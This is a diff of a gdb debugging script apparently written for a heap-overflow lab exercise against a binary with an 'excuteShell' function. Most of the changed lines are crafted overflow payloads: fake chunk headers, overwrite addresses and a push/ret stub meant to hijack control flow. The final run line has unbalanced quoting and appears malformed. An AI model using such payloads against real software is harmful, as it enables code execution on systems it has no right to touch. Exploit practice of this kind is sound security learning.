@@ -1,4 +1,4 @@
-set disassembly intel
+set disassembly-flavor intel
 set pagination off
 l
 b 19
@@ -7,15 +7,20 @@ b 25
 
 r aaaaaaaaaa bbbbbbbbbbbb cccccccccc
 info proc map
-x/22000wx 0x403000
+
+define hook-stop
+ x/40wx 0x403150
+end
 
 
-r aaaaaaaaaa `python -c "print 'b'*48+'\x64'" `  cccccc
 disassemble main
-x/3i 0x00400761
-x 0x4004c0
+x/3i 0x4004c0
+p $ebx+0x1c
+x excuteShell  
 
-x excuteShell
 
 
-r aaaa\xb8\x3d\x06\x40\x00\xff\xd0  `python -c "print 'b'*44+'\x64'" ` `python -c "print 'c'*100+'\xfc\xff\xff\xff\xfc\xff\xff\xff\xff\x61\x07\x40\x00\x68\x31\x40'"`
+
+r aaaa  `python -c "print '\xff'*16+'\x68\x3d\x06\x40\x00\xc3'  +'\xff'* 10+'\xfc\xff\xff\xff\xfc\xff\xff\xff\xff'" ` `python -c "print '\xff'*4+ '\xce\x1f\x40\x00\xa0\x31\x40'"`
+
+r aaaa`python -c "print '\x68\x3d\x06\x40\x00\xc3'  `python -c "print 'b'*44+'\x64'" ` `python -c "print 'c'*100+'\xfc\xff\xff\xff\xfc\xff\xff\xff\xff\x52\x02\x42\x00\x68\x31\x40'"`
